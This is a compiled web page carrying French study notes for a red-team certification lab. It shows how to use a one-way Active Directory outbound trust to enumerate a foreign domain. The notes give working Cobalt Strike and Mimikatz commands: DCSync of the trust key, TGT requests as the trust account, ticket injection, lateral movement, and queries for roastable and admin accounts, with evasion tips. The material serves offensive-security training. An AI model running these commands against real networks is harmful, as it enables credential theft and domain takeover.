import{_ as s,o as t,c as a,am as o}from"./chunks/framework.yj4qiWdr.js";const b=JSON.parse('{"title":"Lab — Outbound Trusts","description":"","frontmatter":{"pageClass":"crto-page","prev":false,"next":false},"headers":[],"relativePath":"crto/liham/labs/Outbound-Trusts-lab.md","filePath":"crto/liham/labs/Outbound-Trusts-lab.md"}'),n={name:"crto/liham/labs/Outbound-Trusts-lab.md"};function i(c,e,r,l,d,p){return t(),a("div",null,e[0]||(e[0]=[o(`<h1 id="lab-—-outbound-trusts" tabindex="-1">Lab — Outbound Trusts <a class="header-anchor" href="#lab-—-outbound-trusts" aria-label="Permalink to &quot;Lab — Outbound Trusts&quot;">​</a></h1><blockquote><p>L’objectif est d’effectuer une <strong>énumération entre deux domaines</strong> liés par une Outbound Trust à sens unique, à partir de la clé inter-realm stockée dans le Trusted Domain Object (TDO).</p></blockquote><hr><h2 id="relation-de-trust" tabindex="-1">Relation de Trust <a class="header-anchor" href="#relation-de-trust" aria-label="Permalink to &quot;Relation de Trust&quot;">​</a></h2><p>Ce lab explore la <strong>direction inverse</strong> de celui consacré aux Inbound Trusts.</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>┌─────────────────────────────────────┐        ┌─────────────────────────────────────┐</span></span>
<span class="line"><span>│           PARTNER.COM               │        │          CONTOSO.COM                │</span></span>
<span class="line"><span>│  (OUR domain — beacon runs here)    │        │  (foreign domain — target of enum)  │</span></span>
<span class="line"><span>│                                     │        │                                     │</span></span>
<span class="line"><span>│  Domain SID:                        │        │  Domain SID:                        │</span></span>
<span class="line"><span>│  S-1-5-21-4244029708-               │        │  S-1-5-21-3926355307-               │</span></span>
<span class="line"><span>│       1901239654-2578485347         │        │       1661546229-813047887          │</span></span>
<span class="line"><span>│                                     │        │                                     │</span></span>
<span class="line"><span>│  trustDirection = 2 (OUTBOUND) ─────┼───────►│  PARTNER trusts CONTOSO             │</span></span>
<span class="line"><span>│                                     │        │                                     │</span></span>
<span class="line"><span>│  Our resources trust CONTOSO users  │        │  DC: lon-dc-1.contoso.com           │</span></span>
<span class="line"><span>│  CONTOSO users can access US        │        │  KDC: 10.10.120.1                   │</span></span>
<span class="line"><span>└─────────────────────────────────────┘        └─────────────────────────────────────┘</span></span>
<span class="line"><span>         TRUSTING domain                                   TRUSTED domain</span></span>
<span class="line"><span>   (resources are here — our beacon)                 (accounts originate here)</span></span></code></pre></div><p><strong>Flux normal (légitime) :</strong></p><blockquote><p>Les utilisateurs CONTOSO s’authentifient auprès du DC PARTNER et accèdent aux ressources PARTNER. L’inverse n’est pas autorisé par cette Trust à sens unique.</p></blockquote><p><strong>Scénario d’attaque :</strong></p><blockquote><p>Le point de départ est PARTNER (domaine faisant confiance). Normalement, aucun accès à CONTOSO (domaine approuvé) n’est accordé.<br> La clé inter-realm est toutefois stockée <strong>des deux côtés</strong>.<br> Le scénario utilise DCSync sur le TDO de PARTNER pour récupérer cette clé partagée, puis s’authentifier au KDC de CONTOSO sous le compte de Trust.<br> Cela permet d’obtenir un contexte authentifié dans CONTOSO pour l’énumération.</p></blockquote><hr><h2 id="qu-est-ce-qu-un-trusted-domain-object-tdo" tabindex="-1">Qu’est-ce qu’un Trusted Domain Object (TDO) ? <a class="header-anchor" href="#qu-est-ce-qu-un-trusted-domain-object-tdo" aria-label="Permalink to &quot;Qu’est-ce qu’un Trusted Domain Object (TDO) ?&quot;">​</a></h2><p>Lors de la création d’une Trust, chaque domaine conserve un objet <code>trustedDomain</code> dans <code>CN=System</code>. Cet objet contient :</p><ul><li>Le FQDN et le SID du domaine partenaire.</li><li>La direction de la Trust et ses attributs.</li><li>La <strong>clé inter-realm</strong>, secret partagé (hash de mot de passe) utilisé par les KDC pour les tickets cross-realm.</li></ul><p>La clé de Trust est stockée dans le TDO comme le secret d’un compte machine. Dans le scénario, DCSync peut la répliquer, mais le TDO doit être ciblé par son <strong>objectGUID</strong>, car il ne s’agit pas d’un compte utilisateur.</p><hr><h2 id="trust-account-—-partner-dans-contoso" tabindex="-1">Trust Account — PARTNER$ dans CONTOSO <a class="header-anchor" href="#trust-account-—-partner-dans-contoso" aria-label="Permalink to &quot;Trust Account — PARTNER$ dans CONTOSO&quot;">​</a></h2><p>Lors de l’établissement de la Trust, CONTOSO a créé dans son annuaire un compte <strong><code>PARTNER$</code></strong>. Son secret correspond à la clé inter-realm présente dans le TDO de PARTNER. Ce compte représente le domaine PARTNER auprès du KDC de CONTOSO.</p><p>Le KDC de CONTOSO utilise la clé de <code>PARTNER$</code> pour valider les tickets cross-realm venant de PARTNER. Le lab montre qu’une clé récupérée peut permettre une authentification <code>PARTNER$</code> et l’obtention d’un TGT donnant un accès de lecture authentifié à l’annuaire CONTOSO.</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>What we have:            What we want:</span></span>
<span class="line"><span>PARTNER DA access   →    Enumerate CONTOSO (find Kerberoastable accounts,</span></span>
<span class="line"><span>                         users, groups, further attack paths)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>The bridge:</span></span>
<span class="line"><span>TDO inter-realm key (DCSync from PARTNER) → authenticate as PARTNER$ to CONTOSO KDC</span></span>
<span class="line"><span>→ TGT for PARTNER$@CONTOSO → LDAP queries against CONTOSO</span></span></code></pre></div><h2 id="deroulement-du-lab" tabindex="-1">Déroulement du lab <a class="header-anchor" href="#deroulement-du-lab" aria-label="Permalink to &quot;Déroulement du lab&quot;">​</a></h2><ol><li><p>Lancer Cobalt Strike et se connecter au team server.</p></li><li><p>Interagir avec le Beacon et énumérer la Trust.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName</span></span></code></pre></div></li></ol><blockquote><p>Interroge le domaine PARTNER pour récupérer les objets <code>trustedDomain</code> dans <code>CN=System,DC=partner,DC=com</code>. Les attributs indiquent :</p><ul><li><code>trustPartner</code> — FQDN du domaine partenaire (ici <code>contoso.com</code>).</li><li><code>trustDirection</code> — Direction de la Trust du point de vue de PARTNER.</li><li><code>trustAttributes</code> — Flags (8 = forest trust avec SID filtering).</li><li><code>flatName</code> — Nom NetBIOS du partenaire (par exemple <code>CONTOSO</code>).</li></ul></blockquote><p>⚠️ Comment interpréter les résultats ?</p><blockquote><ul><li><code>trustDirection 2</code> = <strong>TRUST_DIRECTION_OUTBOUND</strong> — PARTNER fait confiance à CONTOSO. Les utilisateurs CONTOSO peuvent accéder aux ressources PARTNER, mais pas l’inverse.</li><li><code>trustAttributes 8</code> = <strong>TRUST_ATTRIBUTE_FOREST_TRANSITIVE</strong> — Forest Trust avec SID filtering à la frontière. Le scénario ne permet pas d’injecter librement des SID History dans les tickets qui traversent cette frontière.</li></ul></blockquote><ol start="3"><li><p>Récupérer le GUID du TDO.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID</span></span></code></pre></div></li></ol><blockquote><p><strong>Pourquoi le GUID ?</strong> DCSync réplique habituellement des objets de comptes utilisateurs ou machines identifiés par <code>sAMAccountName</code>.<br> Le TDO est un objet <code>trustedDomain</code> stocké dans <code>CN=System</code>.<br> Pour le cibler avec DCSync (Mimikatz <code>lsadump::dcsync</code>), il faut utiliser son <code>objectGUID</code> avec l’option <code>/guid:</code>.</p><p>Le GUID <code>{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}</code> correspond au TDO de PARTNER pour CONTOSO. Il constitue la variable <code>[TDO_GUID]</code> utilisée à l’étape 5.</p></blockquote><ol start="4"><li>Injecter un payload Beacon dans le processus <code>vwebber</code>.</li></ol><blockquote><p>DCSync nécessite les permissions de réplication <code>DS-Replication-Get-Changes</code> et <code>DS-Replication-Get-Changes-All</code>.</p></blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>process_browser</span></span>
<span class="line"><span>steal_token &lt;pid vwebber&gt;</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟠CAUTION</strong> L’injection de processus produit de la télémétrie. Les notes privilégient <code>steal_token &lt;pid&gt;</code> lorsqu’une simple Token Impersonation suffit pour DCSync.</p></blockquote><blockquote><p>⚠️ <strong>Lateral Movement vers par-dc-1 — <code>jump scshell64</code> échoue si <code>defragsvc</code> est déjà actif (observé le 29/04/2026) :</strong></p></blockquote><blockquote><p>Jump vers le Domain Controller PARTNER :</p></blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>jump winrm64 par-dc-1 smb</span></span></code></pre></div><ol start="5"><li>Utiliser le nouveau Beacon pour récupérer la clé inter-realm partagée du TDO avec DCSync.</li></ol><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}</span></span></code></pre></div><p>OPSEC-🔴UNSAFE (chemin Cobalt Strike uniquement, sans alternative dans le Beacon selon les notes) Effectue une requête DCSync vers le DC de PARTNER (<code>/domain:partner.com</code>). L’option <code>/guid:</code> demande à Mimikatz de répliquer l’objet TDO précis plutôt qu’un compte utilisateur.</p><blockquote><p>Le TDO stocke le secret de Trust comme un compte machine stocke son mot de passe. Mimikatz extrait :</p><ul><li><code>rc4_hmac_nt</code> — Hash RC4/NT de la clé de Trust, noté <code>[TRUST KEY]</code> à l’étape 6.</li><li><code>aes256_hmac</code> — Version AES256 de cette clé, à privilégier lorsque la commande l’accepte.</li></ul><p>Relever la valeur <code>rc4_hmac_nt</code> dans la sortie.</p><p><strong>OPSEC-🔴UNSAFE</strong> — DCSync peut générer l’<strong>Event 4662</strong> sur le DC de PARTNER. Une réplication du TDO plutôt que d’un compte peut être inhabituelle dans les logs. Utiliser AES256 lorsqu’il est disponible, selon les notes.</p><p>⚠️ <strong><code>[Out]</code> et <code>[Out-1]</code> — utiliser <code>[Out]</code> (observé le 29/04/2026) :</strong> le TDO présente <code>[Out]</code> (clé courante) et <code>[Out-1]</code> (clé précédente).<br> L’utilisation du hash RC4 de <code>[Out-1]</code> peut faire échouer <code>krb_asktgt</code> avec <strong>Kerberos error 24</strong> (<code>KDC_ERR_PREAUTH_FAILED</code>).<br> Dans ce lab, prendre la clé du bloc <code>[Out]</code> et privilégier <code>aes256_hmac</code> à <code>rc4_hmac_nt</code>.</p></blockquote><ol start="6"><li>Demander un TGT du compte de Trust à l’aide du secret partagé.</li></ol><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>krb_asktgt /user:PARTNER$ /aes256:[TRUST KEY AES256 from [Out]] /domain:contoso.com /dc:lon-dc-1.contoso.com</span></span>
<span class="line"><span>krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com</span></span></code></pre></div><blockquote><p><strong>Fonctionnement :</strong> une requête AS-REQ est envoyée au <strong>KDC de CONTOSO</strong> (<code>/dc:lon-dc-1.contoso.com</code>, DC du domaine distant) afin d’obtenir un TGT pour <code>PARTNER$</code>.</p><p><strong>Pourquoi <code>PARTNER$</code> dans <code>contoso.com</code> ?</strong> CONTOSO a créé ce compte de Trust dans <code>CN=Users,DC=contoso,DC=com</code>. Son secret est la clé inter-realm partagée avec le TDO de PARTNER.</p><p>Le KDC de CONTOSO valide l’AS-REQ avec la clé de <code>PARTNER$</code> et émet un TGT pour <code>PARTNER$@CONTOSO.COM</code>.</p><p><strong>Ticket obtenu :</strong> <code>TGT_PARTNER$</code> est un TGT Kerberos émis par CONTOSO. Dans le lab, il fournit une identité authentifiée avec des droits suffisants pour l’énumération LDAP.</p><p><strong>OPSEC-🟠CAUTION</strong> — Peut générer l’<strong>Event 4768</strong> (AS-REQ) sur <code>lon-dc-1</code>. Une authentification RC4 de <code>PARTNER$</code> depuis une IP inattendue peut être signalée par MDI ou un SIEM.</p></blockquote><ol start="7"><li>Injecter le TGT dans une session de logon temporaire.</li></ol><blockquote><p><strong>Pourquoi une session temporaire ?</strong> Injecter un ticket dans la session courante peut provoquer un conflit Kerberos. Une session isolée créée avec <code>make_token</code> et des credentials fictifs permet d’utiliser le TGT CONTOSO sans modifier la session principale du Beacon.</p></blockquote><pre><code>**Étape 7a — Créer une session de logon temporaire :**
</code></pre><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>make_token CONTOSO\\PARTNER$ FakePassword</span></span></code></pre></div><blockquote><p>Crée une session de logon de type 9. Le mot de passe est un placeholder non validé sur le réseau ; la session accueille le ticket injecté.</p></blockquote><pre><code>**Étape 7b — Convertir le ticket Base64 en \`.kirbi\` sur l’Attacker Desktop :**
</code></pre><blockquote><p><strong>Important :</strong> <code>kerberos_ticket_use</code> attend le <strong>chemin d’un fichier <code>.kirbi</code></strong> sur le client Cobalt Strike, pas la chaîne Base64 brute. Sinon, l’erreur <code>&#39;C:\\Tools\\cobaltstrike\\client\\doIFZD...&#39; does not exist</code> peut apparaître.</p></blockquote><blockquote><p>Sur l’Attacker Desktop, convertir le Base64 en fichier <code>.kirbi</code> avec PowerShell :</p></blockquote><div class="language-powershell vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">IO.File</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::WriteAllBytes(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;C:\\Users\\Attacker\\Desktop\\partner.kirbi&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">,</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;"> [</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">Convert</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::FromBase64String(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;[BASE64_TGT]&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">))</span></span></code></pre></div><p>Puis injecter le ticket avec la commande native Cobalt Strike :</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>kerberos_ticket_use C:\\Users\\Attacker\\Desktop\\partner.kirbi</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟢SAFE</strong> — Injection via l’API Windows Kerberos, sans nouveau processus ni écriture disque sur la cible. Le <code>.kirbi</code> reste sur l’Attacker Desktop.</p></blockquote><ol start="8"><li><p>Énumérer le domaine approuvé.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid</span></span></code></pre></div></li></ol><blockquote><p><strong>Fonctionnement :</strong> interroge LDAP sur CONTOSO avec le TGT <code>PARTNER$</code> injecté. <code>--hostname contoso.com</code> et <code>--dn DC=contoso,DC=com</code> ciblent explicitement l’annuaire du domaine distant.</p><p><code>PARTNER$</code> dispose des permissions de lecture d’un utilisateur authentifié dans CONTOSO, notamment pour :</p><ul><li>Lire les objets utilisateurs, groupes et ordinateurs.</li></ul></blockquote><h2 id="post-enumeration-—-exploiter-les-resultats-contoso" tabindex="-1">Post-Enumeration — Exploiter les résultats CONTOSO <a class="header-anchor" href="#post-enumeration-—-exploiter-les-resultats-contoso" aria-label="Permalink to &quot;Post-Enumeration — Exploiter les résultats CONTOSO&quot;">​</a></h2><p>Après l’obtention du TGT <code>PARTNER$@CONTOSO.COM</code>, les requêtes LDAP suivantes permettent de poursuivre l’énumération :</p><h3 id="identifier-les-comptes-kerberoastable-dans-contoso" tabindex="-1">Identifier les comptes Kerberoastable dans CONTOSO <a class="header-anchor" href="#identifier-les-comptes-kerberoastable-dans-contoso" aria-label="Permalink to &quot;Identifier les comptes Kerberoastable dans CONTOSO&quot;">​</a></h3><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (&amp;(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))) --hostname contoso.com --dn DC=contoso,DC=com --attributes samAccountName,servicePrincipalName</span></span></code></pre></div><blockquote><p>Les comptes avec un SPN peuvent être examinés pour Kerberoasting. Un service ticket chiffré avec le secret du compte peut être analysé hors ligne. Le lab utilise <code>krb_asktgs /service:&lt;SPN&gt; /ticket:[PARTNER$_TGT]</code> depuis la session temporaire.</p></blockquote><h3 id="identifier-les-comptes-as-rep-roastable-dans-contoso" tabindex="-1">Identifier les comptes AS-REP Roastable dans CONTOSO <a class="header-anchor" href="#identifier-les-comptes-as-rep-roastable-dans-contoso" aria-label="Permalink to &quot;Identifier les comptes AS-REP Roastable dans CONTOSO&quot;">​</a></h3><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --hostname contoso.com --dn DC=contoso,DC=com --attributes samAccountName</span></span></code></pre></div><blockquote><p>Le flag <code>userAccountControl</code> <code>4194304</code> correspond à <code>DONT_REQUIRE_PREAUTH</code>. Ces comptes peuvent renvoyer une réponse AS-REP sans pré-authentification, exploitable pour une analyse hors ligne.</p></blockquote><h3 id="identifier-les-comptes-domain-admin-dans-contoso" tabindex="-1">Identifier les comptes Domain Admin dans CONTOSO <a class="header-anchor" href="#identifier-les-comptes-domain-admin-dans-contoso" aria-label="Permalink to &quot;Identifier les comptes Domain Admin dans CONTOSO&quot;">​</a></h3><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (memberOf=CN=Domain Admins,CN=Users,DC=contoso,DC=com) --hostname contoso.com --dn DC=contoso,DC=com --attributes samAccountName,userAccountControl</span></span></code></pre></div><h3 id="identifier-d-autres-trusts-depuis-contoso" tabindex="-1">Identifier d’autres Trusts depuis CONTOSO <a class="header-anchor" href="#identifier-d-autres-trusts-depuis-contoso" aria-label="Permalink to &quot;Identifier d’autres Trusts depuis CONTOSO&quot;">​</a></h3><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (objectClass=trustedDomain) --hostname contoso.com --dn DC=contoso,DC=com --attributes trustDirection,trustPartner,trustAttributes</span></span></code></pre></div><blockquote><p>CONTOSO peut posséder des Trusts vers d’autres domaines, ce qui élargit le périmètre d’énumération. Le scénario envisage une chaîne PARTNER → CONTOSO → THIRD_DOMAIN.</p></blockquote>`,68)]))}const m=s(n,[["render",i]]);export{b as __pageData,m as default};
